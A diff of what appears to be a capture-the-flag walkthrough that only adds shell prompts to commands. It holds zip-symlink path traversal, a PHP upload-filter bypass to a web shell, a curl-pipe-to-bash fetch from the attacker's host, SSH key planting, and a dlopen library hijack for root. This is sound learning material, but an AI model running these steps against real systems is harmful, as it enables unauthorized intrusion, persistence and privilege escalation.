@@ -22,8 +22,8 @@ The path I took: read the upload handler's own source with a zip symlink, see th
 Full TCP scan, then versioned scan on the open ports:
 
 ```bash
-nmap -p- --min-rate 10000 -T4 10.129.102.182
-nmap -p 22,80 -sCV 10.129.102.182
+$ nmap -p- --min-rate 10000 -T4 10.129.102.182
+$ nmap -p 22,80 -sCV 10.129.102.182
 ```
 
 ```
@@ -56,8 +56,8 @@ The upload page said it only accepts zip files that contain a single PDF resume.
 I went for source disclosure first with a zip symlink. The idea is to put a symlink inside the archive whose target is a file on the server, preserve the link with `zip --symlinks`, and let the server's extraction follow it. The default single-level traversal payload from the blog posts did not work, so I used a doubled-up `....//` traversal as the symlink target, which survives a single round of naive `../` stripping, and zipped it preserving the link:
 
 ```bash
-ln -s ....//....//....//....//....//....//....//etc/passwd lol.pdf
-zip -r --symlinks lma.zip lol.pdf
+$ ln -s ....//....//....//....//....//....//....//etc/passwd lol.pdf
+$ zip -r --symlinks lma.zip lol.pdf
 ```
 
 I uploaded `lma.zip`, then browsed the extracted path the page handed back. The server followed the symlink and served `/etc/passwd`, which confirmed arbitrary file read:
@@ -75,8 +75,8 @@ _laurel:x:999:999::/var/log/laurel:/bin/false
 The same trick reads source. I pointed the symlink at the upload handler itself:
 
 ```bash
-ln -s ....//....//....//....//....//....//....//var/www/html/upload.php a.pdf
-zip -r --symlinks demo.zip a.pdf
+$ ln -s ....//....//....//....//....//....//....//var/www/html/upload.php a.pdf
+$ zip -r --symlinks demo.zip a.pdf
 ```
 
 The returned source showed the whole logic, and the extension check was the weak point:
@@ -114,18 +114,18 @@ That mismatch is the bug. A name like `x.php<anything>.pdf` clears PHP's `pathin
 ```
 
 ```bash
-zip pop.zip rev.phpg.pdf
+$ zip pop.zip rev.phpg.pdf
 ```
 
 Uploading it, then browsing the extracted file with a `?cmd=` parameter, gave command execution as `rektsu` (the Apache worker runs as `rektsu` on this box). I used that to pull and run a one-liner that dropped my SSH key into `authorized_keys`:
 
 ```bash
-curl http://10.10.14.4:8000/shell.sh | bash
+$ curl http://10.10.14.4:8000/shell.sh | bash
 ```
 
 ```bash
 # shell.sh
-echo "ssh-rsa AAAAB3NzaC1yc2E...exasecu@exasecu" >> /home/rektsu/.ssh/authorized_keys
+$ echo "ssh-rsa AAAAB3NzaC1yc2E...exasecu@exasecu" >> /home/rektsu/.ssh/authorized_keys
 ```
 
 ## user
@@ -133,7 +133,7 @@ echo "ssh-rsa AAAAB3NzaC1yc2E...exasecu@exasecu" >> /home/rektsu/.ssh/authorized
 With my key in `authorized_keys` I logged in over SSH as `rektsu`:
 
 ```bash
-ssh -i id_rsa rektsu@10.129.102.182
+$ ssh -i id_rsa rektsu@10.129.102.182
 ```
 
 The user flag was in the home directory. A reverse shell over `/dev/tcp` works the same way, but a key gives a stable session for the privesc enumeration.
@@ -143,7 +143,7 @@ The user flag was in the home directory. A reverse shell over `/dev/tcp` works t
 sudo first. One NOPASSWD entry stood out:
 
 ```bash
-sudo -l
+$ sudo -l
 ```
 
 ```
@@ -188,7 +188,7 @@ local_28 = dlopen(&local_e8,1);
 Rather than reverse the XOR by hand, I let strace tell me exactly what path it tries to load:
 
 ```bash
-strace /usr/bin/stock
+$ strace /usr/bin/stock
 ```
 
 ```
@@ -213,9 +213,9 @@ void _init() {
 I compiled it as a position-independent shared object without the default startup files (so my `_init` is the one that fires), placed it at the expected path, and ran the sudo binary:
 
 ```bash
-mkdir -p /home/rektsu/.config
-gcc -shared -nostartfiles -o /home/rektsu/.config/libcounter.so -fPIC exploit.c
-sudo /usr/bin/stock
+$ mkdir -p /home/rektsu/.config
+$ gcc -shared -nostartfiles -o /home/rektsu/.config/libcounter.so -fPIC exploit.c
+$ sudo /usr/bin/stock
 ```
 
 After entering `St0ckM4nager`, the `dlopen` pulled in my library, the constructor fired as root, and I had a root shell to read the root flag:
